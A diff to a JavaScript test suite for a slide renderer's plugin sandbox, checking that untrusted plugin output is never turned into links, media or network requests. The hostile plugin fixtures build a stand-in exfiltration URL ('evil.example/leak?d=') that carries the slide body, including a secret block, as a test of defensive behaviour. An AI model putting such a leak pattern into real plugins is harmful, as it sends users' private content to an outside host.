@@ -244,14 +244,38 @@ describe('the fence door through the real sandbox', () => {
 
   test('A SLIDE A SHIPPED PASS REBUILDS FROM ITS TEXT: the fence stays code, nothing reads the plugin’s text as an address', { timeout: TIMEOUT }, async () => {
     hits = [];
-    const md = '---\ntheme: indaco\n---\n\n<!-- _class: video -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
+    // `closing qr` is still rebuilt by a shipped pass (`qr-general` turns a bullet into a code); `video` is not any more.
+    const md = '---\ntheme: indaco\n---\n\n<!-- _class: closing qr -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
     const p = plugin(`function render(f){return "<ul><li>https://evil.example/leak?d="+encodeURIComponent(f.body)+" <code>poster</code></li></ul>"}\nexport { render as default };`);
     approve(p);
     const r = run(p, md);
     assert.doesNotMatch(r.rendered.html, /data-lattice-plugin/, 'the plugin never drew there');
     assert.match(r.rendered.html, /language-gantt/, 'the author’s block is still code');
     assert.doesNotMatch(r.rendered.html, /evil\.example/, 'no pass could read the plugin’s text as an address, because it never ran');
-    assert.ok(r.lines.warn.some((l) => /slide 1 is rebuilt by the shipped `video` pass/.test(l)), r.lines.warn.join('\n'));
+    assert.ok(r.lines.warn.some((l) => /slide 1 is rebuilt by the shipped `qr-general` pass/.test(l)), r.lines.warn.join('\n'));
+    await settle();
+    assert.deepEqual(hits, []);
+  });
+
+  test('A VIDEO SLIDE: the plugin DRAWS, and the address it wrote is only text — nothing of ours turns it into a poster, link or code', { timeout: TIMEOUT }, async () => {
+    hits = [];
+    // Flipped from "the plugin never drew" (when the `video` pass read the slide's bullets): the address now comes only from the
+    // author's `@video{…}` span, so there is nothing for a plugin's text to be mistaken for (engineering/decisions/2026-10-16-media-plugins.md § 4.5).
+    const md = '---\ntheme: indaco\n---\n\n<!-- _class: video qr -->\n\n## Clip\n\n`@video{"https://www.youtube.com/watch?v=dQw4w9WgXcQ"}`\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
+    const p = plugin(`function render(f){return "<ul><li>https://evil.example/leak?d="+encodeURIComponent(f.body)+" <code>poster</code></li></ul><p><code>@video{\\"https://youtu.be/AAAAAAAAAAA\\"}</code></p>"}\nexport { render as default };`);
+    approve(p);
+    const r = run(p, md);
+    const html = r.rendered.html;
+    assert.match(html, /data-lattice-plugin="gantt-plugin"/, 'the plugin drew');
+    assert.doesNotMatch(html, /language-gantt/, 'in place of the block');
+    const root = /<div data-lattice-plugin="gantt-plugin">[\s\S]*?<\/div>/.exec(html)?.[0] ?? '';
+    assert.match(root, /evil\.example\/leak\?d=/, 'its address is on the slide, as text');
+    assert.doesNotMatch(html.replace(root, ''), /evil\.example/, 'and nowhere outside the plugin’s root');
+    assert.doesNotMatch(root, /<a\b|href=|url\(|<svg|<img/, 'nothing was built from it');
+    assert.match(root, /<code>@video\{/, 'its own `@video` span is still literal code');
+    assert.equal((html.match(/data-lattice-media="video"/g) || []).length, 1, 'one video figure: the author’s');
+    assert.match(html, /href="https:\/\/www\.youtube\.com\/watch\?v=dQw4w9WgXcQ"/, 'and it still links to the author’s clip');
+    assert.ok(!r.lines.warn.some((l) => /rebuilt by the shipped/.test(l)), r.lines.warn.join('\n'));
     await settle();
     assert.deepEqual(hits, []);
   });
